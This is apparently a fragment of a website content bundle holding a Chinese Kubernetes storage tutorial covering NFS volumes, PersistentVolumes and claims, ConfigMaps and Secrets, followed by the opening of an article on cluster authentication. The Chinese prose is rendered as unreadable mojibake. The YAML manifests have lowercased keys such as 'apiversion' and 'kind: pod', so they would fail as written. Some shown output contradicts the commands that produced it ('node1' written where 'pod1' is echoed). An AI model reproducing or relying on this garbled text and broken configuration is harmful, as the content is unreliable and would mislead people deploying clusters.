·çéçï¼å¦æå¨æ­¤ç®å½ä¸åå»ºä¸ä¸ªæä»¶ï¼å°å®¹å¨ä¸­ä¹æ¯å¯ä»¥çå°ç\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> æ³¨æï¼pod è¢« k8s é¨ç½²å¨åªä¸ª nodeï¼æä»¶å°±å¨é£ä¸ª node ä¸æè½½\n\n\n# nfs\n\nhostpath å¯ä»¥è§£å³æ°æ®æä¹åçé®é¢ï¼ä½æ¯ä¸æ¦ node èç¹æéäºï¼pod å¦æè½¬ç§»å°äºå«çèç¹ï¼åä¼åºç°é®é¢äºï¼æ­¤æ¶éè¦åå¤åç¬çç½ç»å­å¨ç³»ç»ï¼æ¯è¾å¸¸ç¨çç¨ nfsãcifsã\n\nnfs æ¯ä¸ä¸ªç½ç»æä»¶å­å¨ç³»ç»ï¼å¯ä»¥æ­å»ºä¸å° nfs æå¡å¨ï¼ç¶åå° pod ä¸­çå­å¨ç´æ¥è¿æ¥å° nfs ç³»ç»ä¸ï¼è¿æ ·çè¯ï¼æ è®º pod å¨èç¹ä¸æä¹è½¬ç§»ï¼åªè¦ node è· nfs çå¯¹æ¥æ²¡é®é¢ï¼æ°æ®å°±å¯ä»¥æåè®¿é®ã\n\n\n\n1ï¼é¦åè¦åå¤ nfs çæå¡å¨ï¼è¿éä¸ºäºç®åï¼ç´æ¥æ¯ master èç¹å nfs æå¡å¨\n\n# å¨nfsä¸å®è£nfsæå¡\n[root@nfs ~]# yum install nfs-utils -y\n\n# åå¤ä¸ä¸ªå±äº«ç®å½\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# å°å±äº«ç®å½ä»¥è¯»åæéæ´é²ç»192.168.5.0/24ç½æ®µä¸­çææä¸»æº\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# å¯å¨nfsæå¡\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2ï¼æ¥ä¸æ¥ï¼è¦å¨çæ¯ä¸ª node èç¹ä¸é½å®è£ä¸ nfsï¼è¿æ ·çç®çæ¯ä¸ºäº node èç¹å¯ä»¥é©±å¨ nfs è®¾å¤\n\n# å¨nodeä¸å®è£nfsæå¡ï¼æ³¨æä¸éè¦å¯å¨\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3ï¼æ¥ä¸æ¥ï¼å°±å¯ä»¥ç¼å pod çéç½®æä»¶äºï¼åå»º volume-nfs.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumemounts:\n    - name: logs-volume\n      mountpath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfsæå¡å¨å°å\n      path: /root/data/nfs #å±äº«æä»¶è·¯å¾\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4ï¼æåï¼è¿è¡ä¸ podï¼è§å¯ç»æ\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nname                  ready   status    restarts   age\nvolume-nfs        2/2     running   0          2m9s\n\n# æ¥çnfsæå¡å¨ä¸çå±äº«ç®å½ï¼åç°å·²ç»ææä»¶äº\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# é«çº§å­å¨\n\nåé¢å·²ç»å­¦ä¹ äºä½¿ç¨ nfs æä¾å­å¨ï¼æ­¤æ¶å°±è¦æ±ç¨æ·ä¼æ­å»º nfs ç³»ç»ï¼å¹¶ä¸ä¼å¨ yaml éç½® nfsãç±äº kubernetes æ¯æçå­å¨ç³»ç»æå¾å¤ï¼è¦æ±å®¢æ·å¨é½ææ¡ï¼æ¾ç¶ä¸ç°å®ãä¸ºäºè½å¤å±è½åºå±å­å¨å®ç°çç»èï¼æ¹ä¾¿ç¨æ·ä½¿ç¨ï¼ kubernetes å¼å¥ pv å pvc ä¸¤ç§èµæºå¯¹è±¡ã\n\npvï¼persistent volumeï¼æ¯æä¹åå·çææï¼æ¯å¯¹åºå±çå±äº«å­å¨çä¸ç§æ½è±¡ãä¸è¬æåµä¸ pv ç± kubernetes ç®¡çåè¿è¡åå»ºåéç½®ï¼å®ä¸åºå±å·ä½çå±äº«å­å¨ææ¯æå³ï¼å¹¶éè¿æä»¶å®æä¸å±äº«å­å¨çå¯¹æ¥ã\n\npvcï¼persistent volume claimï¼æ¯æä¹å·å£°æçææï¼æ¯ç¨æ·å¯¹äºå­å¨éæ±çä¸ç§å£°æãæ¢å¥è¯è¯´ï¼pvc å¶å®å°±æ¯ç¨æ·å kubernetes ç³»ç»ååºçä¸ç§èµæºéæ±ç³è¯·ã\n\n\n\nä½¿ç¨äº pv å pvc ä¹åï¼å·¥ä½å¯ä»¥å¾å°è¿ä¸æ­¥çç»åï¼\n\n * å­å¨ï¼å­å¨å·¥ç¨å¸ç»´æ¤\n * pvï¼ kubernetes ç®¡çåç»´æ¤\n * pvcï¼kubernetes ç¨æ·ç»´æ¤\n\n\n# pv\n\npv æ¯å­å¨èµæºçæ½è±¡ï¼ä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiversion: v1  \nkind: persistentvolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # å­å¨ç±»åï¼ä¸åºå±çæ­£å­å¨å¯¹åº\n  capacity:  # å­å¨è½åï¼ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½®\n    storage: 2gi\n  accessmodes:  # è®¿é®æ¨¡å¼\n  storageclassname: # å­å¨ç±»å«\n  persistentvolumereclaimpolicy: # åæ¶ç­ç¥\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\npv çå³é®éç½®åæ°è¯´æï¼\n\n * å­å¨ç±»å\n   åºå±å®éå­å¨çç±»åï¼kubernetes æ¯æå¤ç§å­å¨ç±»åï¼æ¯ç§å­å¨ç±»åçéç½®é½ææå·®å¼\n * å­å¨è½åï¼capacityï¼\n   ç®ååªæ¯æå­å¨ç©ºé´çè®¾ç½® (storage=1gi)ï¼ä¸è¿æªæ¥å¯è½ä¼å å¥ iopsãååéç­ææ çéç½®\n * è®¿é®æ¨¡å¼ï¼accessmodesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æéï¼è®¿é®æéåæ¬ä¸é¢å ç§æ¹å¼ï¼\n   * readwriteonceï¼rwoï¼ï¼è¯»åæéï¼ä½æ¯åªè½è¢«åä¸ªèç¹æè½½ (æçæ¯ pv ä¸ pvc ç»å®åªè½ä¸ä¸ª)\n   * readonlymanyï¼roxï¼ï¼ åªè¯»æéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n   * readwritemanyï¼rwxï¼ï¼è¯»åæéï¼å¯ä»¥è¢«å¤ä¸ªèç¹æè½½\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçè®¿é®æ¨¡å¼ä¸å\n * åæ¶ç­ç¥ï¼persistentvolumereclaimpolicyï¼\n   å½ pv ä¸åè¢«ä½¿ç¨äºä¹åï¼å¯¹å¶çå¤çæ¹å¼ãç®åæ¯æä¸ç§ç­ç¥ï¼\n   * retain ï¼ä¿çï¼ ä¿çæ°æ®ï¼éè¦ç®¡çåæå·¥æ¸çæ°æ®\n   * recycleï¼åæ¶ï¼ æ¸é¤ pv ä¸­çæ°æ®ï¼ææç¸å½äºæ§è¡ rm -rf /thevolume/*\n   * delete ï¼å é¤ï¼ ä¸ pv ç¸è¿çåç«¯å­å¨å®æ volume çå é¤æä½ï¼å½ç¶è¿å¸¸è§äºäºæå¡åçå­å¨æå¡\n     éè¦æ³¨æçæ¯ï¼åºå±ä¸åçå­å¨ç±»åå¯è½æ¯æçåæ¶ç­ç¥ä¸å\n * å­å¨ç±»å«\n   pv å¯ä»¥éè¿ storageclassname åæ°æå®ä¸ä¸ªå­å¨ç±»å«\n   * å·æç¹å®ç±»å«ç pv åªè½ä¸è¯·æ±äºè¯¥ç±»å«ç pvc è¿è¡ç»å®\n   * æªè®¾å®ç±»å«ç pv ååªè½ä¸ä¸è¯·æ±ä»»ä½ç±»å«ç pvc è¿è¡ç»å®\n * ç¶æï¼statusï¼\n   ä¸ä¸ª pv ççå½å¨æä¸­ï¼å¯è½ä¼å¤äº 4 ä¸­ä¸åçé¶æ®µï¼\n   * availableï¼å¯ç¨ï¼ï¼ è¡¨ç¤ºå¯ç¨ç¶æï¼è¿æªè¢«ä»»ä½ pvc ç»å®\n   * boundï¼å·²ç»å®ï¼ï¼ è¡¨ç¤º pv å·²ç»è¢« pvc ç»å®\n   * releasedï¼å·²éæ¾ï¼ï¼ è¡¨ç¤º pvc è¢«å é¤ï¼ä½æ¯èµæºè¿æªè¢«éç¾¤éæ°å£°æ\n   * failedï¼å¤±è´¥ï¼ï¼ è¡¨ç¤ºè¯¥ pv çèªå¨åæ¶å¤±è´¥\n\nå®éª\nä½¿ç¨ nfs ä½ä¸ºå­å¨ï¼æ¥æ¼ç¤º pv çä½¿ç¨ï¼åå»º 3 ä¸ª pvï¼å¯¹åº nfs ä¸­ç 3 ä¸ªæ´é²çè·¯å¾ã\n1. åå¤ nfs ç¯å¢\n\n# åå»ºç®å½\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# æ´é²æå¡\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# éå¯æå¡\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. åå»º pv.yaml\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiversion: v1\nkind: persistentvolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3gi\n  accessmodes:\n  - readwritemany\n  persistentvolumereclaimpolicy: retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# åå»º pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname   capacity   access modes  reclaim policy  status      age   volumemode\npv1    1gi        rwx            retain        available    10s   filesystem\npv2    2gi        rwx            retain        available    10s   filesystem\npv3    3gi        rwx            retain        available    9s    filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# pvc\n\npvc æ¯èµæºçç³è¯·ï¼ç¨æ¥å£°æå¯¹å­å¨ç©ºé´ãè®¿é®æ¨¡å¼ãå­å¨ç±»å«éæ±ä¿¡æ¯ãä¸é¢æ¯èµæºæ¸åæä»¶:\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessmodes: # è®¿é®æ¨¡å¼\n  selector: # éç¨æ ç­¾å¯¹pvéæ©\n  storageclassname: # å­å¨ç±»å«\n  resources: # è¯·æ±ç©ºé´\n    requests:\n      storage: 5gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\npvc çå³é®éç½®åæ°è¯´æï¼\n\n * è®¿é®æ¨¡å¼ï¼accessmodesï¼\n   ç¨äºæè¿°ç¨æ·åºç¨å¯¹å­å¨èµæºçè®¿é®æé\n * éæ©æ¡ä»¶ï¼selectorï¼\n   éè¿ label selector çè®¾ç½®ï¼å¯ä½¿ pvc å¯¹äºç³»ç»ä¸­å·±å­å¨ç pv è¿è¡ç­é\n * å­å¨ç±»å«ï¼storageclassnameï¼\n   pvc å¨å®ä¹æ¶å¯ä»¥è®¾å®éè¦çåç«¯å­å¨çç±»å«ï¼åªæè®¾ç½®äºè¯¥ class ç pv æè½è¢«ç³»ç»éåº\n * èµæºè¯·æ±ï¼resources ï¼\n   æè¿°å¯¹å­å¨èµæºçè¯·æ±\n\nå®éª\n1. åå»º pvc.yamlï¼ç³è¯· pv\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# åå»ºpvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nname   status   volume   capacity   access modes   storageclass   age   volumemode\npvc1   bound    pv1      1gi        rwx                           15s   filesystem\npvc2   bound    pv2      2gi        rwx                           15s   filesystem\npvc3   bound    pv3      3gi        rwx                           15s   filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname  capacity access modes  reclaim policy  status    claim       age     volumemode\npv1    1gi        rwx        retain          bound    dev/pvc1    3h37m    filesystem\npv2    2gi        rwx        retain          bound    dev/pvc2    3h37m    filesystem\npv3    3gi        rwx        retain          bound    dev/pvc3    3h37m    filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. åå»º pods.yaml, ä½¿ç¨ pv\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc1\n        readonly: false\n---\napiversion: v1\nkind: pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc2\n        readonly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname   ready   status    restarts   age   ip            node   \npod1   1/1     running   0          14s   10.244.1.69   node1   \npod2   1/1     running   0          14s   10.244.1.70   node1  \n\n# æ¥çpvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nname   status   volume   capacity   access modes      age   volumemode\npvc1   bound    pv1      1gi        rwx               94m   filesystem\npvc2   bound    pv2      2gi        rwx               94m   filesystem\npvc3   bound    pv3      3gi        rwx               94m   filesystem\n\n# æ¥çpv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nname   capacity   access modes   reclaim policy   status   claim       age     volumemode\npv1    1gi        rwx            retain           bound    dev/pvc1    5h11m   filesystem\npv2    2gi        rwx            retain           bound    dev/pvc2    5h11m   filesystem\npv3    3gi        rwx            retain           bound    dev/pvc3    5h11m   filesystem\n\n# æ¥çnfsä¸­çæä»¶å­å¨\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# çå½å¨æ\n\npvc å pv æ¯ä¸ä¸å¯¹åºçï¼pv å pvc ä¹é´çç¸äºä½ç¨éµå¾ªä»¥ä¸çå½å¨æï¼\n\n * èµæºä¾åºï¼ç®¡çåæå¨åå»ºåºå±å­å¨å pv\n * èµæºç»å®ï¼ç¨æ·åå»º pvcï¼kubernetes è´è´£æ ¹æ® pvc çå£°æå»å¯»æ¾ pvï¼å¹¶ç»å®\n   å¨ç¨æ·å®ä¹å¥½ pvc ä¹åï¼ç³»ç»å°æ ¹æ® pvc å¯¹å­å¨èµæºçè¯·æ±å¨å·²å­å¨ç pv ä¸­éæ©ä¸ä¸ªæ»¡è¶³æ¡ä»¶ç\n   * ä¸æ¦æ¾å°ï¼å°±å°è¯¥ pv ä¸ç¨æ·å®ä¹ç pvc è¿è¡ç»å®ï¼ç¨æ·çåºç¨å°±å¯ä»¥ä½¿ç¨è¿ä¸ª pvc äº\n   * å¦ææ¾ä¸å°ï¼pvc åä¼æ éæå¤äº pending ç¶æï¼ç´å°ç­å°ç³»ç»ç®¡çååå»ºäºä¸ä¸ªç¬¦åå¶è¦æ±ç pv\n     pvä¸æ¦ç»å®å°æä¸ªpvcä¸ï¼å°±ä¼è¢«è¿ä¸ªpvcç¬å ï¼ä¸è½åä¸å¶ä»pvcè¿è¡ç»å®äº\n * èµæºä½¿ç¨ï¼ç¨æ·å¯å¨ pod ä¸­å volume ä¸æ ·ä½¿ç¨ pvc\n   pod ä½¿ç¨ volume çå®ä¹ï¼å° pvc æè½½å°å®¹å¨åçæä¸ªè·¯å¾è¿è¡ä½¿ç¨ã\n * èµæºéæ¾ï¼ç¨æ·å é¤ pvc æ¥éæ¾ pv\n   å½å­å¨èµæºä½¿ç¨å®æ¯åï¼ç¨æ·å¯ä»¥å é¤ pvcï¼ä¸è¯¥ pvc ç»å®ç pv å°ä¼è¢«æ è®°ä¸º âå·²éæ¾âï¼ä½è¿ä¸è½ç«å»ä¸å¶ä» pvc è¿è¡ç»å®ãéè¿ä¹å pvc åå¥çæ°æ®å¯è½è¿è¢«çå¨å­å¨è®¾å¤ä¸ï¼åªæå¨æ¸é¤ä¹åè¯¥ pv æè½åæ¬¡ä½¿ç¨ã\n * èµæºåæ¶ï¼kubernetes æ ¹æ® pv è®¾ç½®çåæ¶ç­ç¥è¿è¡èµæºçåæ¶\n   å¯¹äº pvï¼ç®¡çåå¯ä»¥è®¾å®åæ¶ç­ç¥ï¼ç¨äºè®¾ç½®ä¸ä¹ç»å®ç pvc éæ¾èµæºä¹åå¦ä½å¤çéçæ°æ®çé®é¢ãåªæ pv çå­å¨ç©ºé´å®æåæ¶ï¼æè½ä¾æ°ç pvc ç»å®åä½¿ç¨\n\n\n\n\n# éç½®å­å¨\n\n\n# configmap\n\nconfigmap æ¯ä¸ç§æ¯è¾ç¹æ®çå­å¨å·ï¼å®çä¸»è¦ä½ç¨æ¯ç¨æ¥å­å¨éç½®ä¿¡æ¯çã\n\nåå»º configmap.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: configmap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\næ¥ä¸æ¥ï¼ä½¿ç¨æ­¤éç½®æä»¶åå»º configmap\n\n# åå»ºconfigmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# æ¥çconfigmapè¯¦æ\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nname:         configmap\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\n\ndata\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nevents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ¥ä¸æ¥åå»ºä¸ä¸ª pod-configmap.yamlï¼å°ä¸é¢åå»ºç configmap æè½½è¿å»\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # å°configmapæè½½å°ç®å½\n    - name: config\n      mountpath: /configmap/config\n  volumes: # å¼ç¨configmap\n  - name: config\n    configmap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nname            ready   status    restarts   age\npod-configmap   1/1     running   0          6s\n\n#è¿å¥å®¹å¨\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# å¯ä»¥çå°æ å°å·²ç»æåï¼æ¯ä¸ªconfigmapé½æ å°æäºä¸ä¸ªç®å½\n# key---\x3eæä»¶     value----\x3eæä»¶ä¸­çåå®¹\n# æ­¤æ¶å¦ææ´æ°configmapçåå®¹, å®¹å¨ä¸­çå¼ä¹ä¼å¨ææ´æ°\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# secret\n\nå¨ kubernetes ä¸­ï¼è¿å­å¨ä¸ç§å configmap éå¸¸ç±»ä¼¼çå¯¹è±¡ï¼ç§°ä¸º secret å¯¹è±¡ãå®ä¸»è¦ç¨äºå­å¨ææä¿¡æ¯ï¼ä¾å¦å¯ç ãç§é¥ãè¯ä¹¦ç­ç­ã\n\n1. é¦åä½¿ç¨ base64 å¯¹æ°æ®è¿è¡ç¼ç \n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #åå¤username\nywrtaw4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #åå¤password\nmtizndu2\n\n\n1\n2\n3\n4\n\n\n2. æ¥ä¸æ¥ç¼å secret.yamlï¼å¹¶åå»º secret\n\napiversion: v1\nkind: secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: opaque\ndata:\n  username: ywrtaw4=\n  password: mtizndu2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# åå»ºsecret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# æ¥çsecretè¯¦æ\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nname:         secret\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\ntype:  opaque\ndata\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. åå»º pod-secret.yamlï¼å°ä¸é¢åå»ºç secret æè½½è¿å»ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # å°secretæè½½å°ç®å½\n    - name: config\n      mountpath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretname: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nname            ready   status    restarts   age\npod-secret      1/1     running   0          2m28s\n\n# è¿å¥å®¹å¨ï¼æ¥çsecretä¿¡æ¯ï¼åç°å·²ç»èªå¨è§£ç äº\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nè³æ­¤ï¼å·²ç»å®ç°äºå©ç¨ secret å®ç°äºä¿¡æ¯çç¼ç ã',charsets:{cjk:!0}},{title:"kubernetes(åäº) å®å¨è®¤è¯",frontmatter:{title:"kubernetes(åäº) å®å¨è®¤è¯",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/611",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/611.kubernetes(%E5%8D%81%E4%BA%8C)%20%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81.html",relativePath:"04.è¿ç»´/60.Kubernetes/611.kubernetes(åäº) å®å¨è®¤è¯.md",key:"v-3a5a1361",path:"/kubernetes/611/",headers:[{level:2,title:"è®¿é®æ§å¶æ¦è¿°",slug:"è®¿é®æ§å¶æ¦è¿°",normalizedTitle:"è®¿é®æ§å¶æ¦è¿°",charIndex:2},{level:2,title:"è®¤è¯ç®¡ç",slug:"è®¤è¯ç®¡ç",normalizedTitle:"è®¤è¯ç®¡ç",charIndex:467},{level:2,title:"ææç®¡ç",slug:"ææç®¡ç",normalizedTitle:"ææç®¡ç",charIndex:1201},{level:2,title:"åå¥æ§å¶",slug:"åå¥æ§å¶",normalizedTitle:"åå¥æ§å¶",charIndex:262}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"è®¿é®æ§å¶æ¦è¿° è®¤è¯ç®¡ç ææç®¡ç åå¥æ§å¶",content:'# è®¿é®æ§å¶æ¦è¿°\n\nKubernetes ä½ä¸ºä¸ä¸ªåå¸å¼éç¾¤çç®¡çå·¥å·ï¼ä¿è¯éç¾¤çå®å¨æ§æ¯å¶ä¸ä¸ªéè¦çä»»å¡ãæè°çå®å¨æ§å¶å®å°±æ¯ä¿è¯å¯¹ Kubernetes çåç§å®¢æ·ç«¯è¿è¡è®¤è¯åé´ææä½ã\n\nå®¢æ·ç«¯\nå¨ Kubernetes éç¾¤ä¸­ï¼å®¢æ·ç«¯éå¸¸æä¸¤ç±»ï¼\n\n * User Accountï¼ä¸è¬æ¯ç¬ç«äº kubernetes ä¹å¤çå¶ä»æå¡ç®¡ççç¨æ·è´¦å·ã\n * Service Accountï¼kubernetes ç®¡ççè´¦å·ï¼ç¨äºä¸º Pod ä¸­çæå¡è¿ç¨å¨è®¿é® Kubernetes æ¶æä¾èº«ä»½æ è¯ã\n\n\n\nè®¤è¯ãææä¸åå¥æ§å¶\nApiServer æ¯è®¿é®åç®¡çèµæºå¯¹è±¡çå¯ä¸å¥å£ãä»»ä½ä¸ä¸ªè¯·æ±è®¿é® ApiServerï¼é½è¦ç»è¿ä¸é¢ä¸ä¸ªæµç¨ï¼\n\n * Authenticationï¼è®¤è¯ï¼ï¼èº«ä»½é´å«ï¼åªææ­£ç¡®çè´¦å·æè½å¤éè¿è®¤è¯\n * Authorizationï¼ææï¼ï¼ å¤æ­ç¨æ·æ¯å¦ææéå¯¹è®¿é®çèµæºæ§è¡ç¹å®çå¨ä½\n * Admission Controlï¼åå¥æ§å¶ï¼ï¼ç¨äºè¡¥åæææºå¶ä»¥å®ç°æ´å ç²¾ç»çè®¿é®æ§å¶åè½ã\n\n\n# è®¤è¯ç®¡ç\n\nKubernetes éç¾¤å®å¨çæå³é®ç¹å¨äºå¦ä½è¯å«å¹¶è®¤è¯å®¢æ·ç«¯èº«ä»½ï¼å®æä¾äº 3 ç§å®¢æ·ç«¯èº«ä»½è®¤è¯æ¹å¼ï¼\n\n * HTTP Base è®¤è¯ï¼éè¿ç¨æ·å + å¯ç çæ¹å¼è®¤è¯\n\n> è¿ç§è®¤è¯æ¹å¼æ¯æ âç¨æ·åï¼å¯ç â ç¨ BASE64 ç®æ³è¿è¡ç¼ç åçå­ç¬¦ä¸²æ¾å¨ HTTP è¯·æ±ä¸­ç Header Authorization 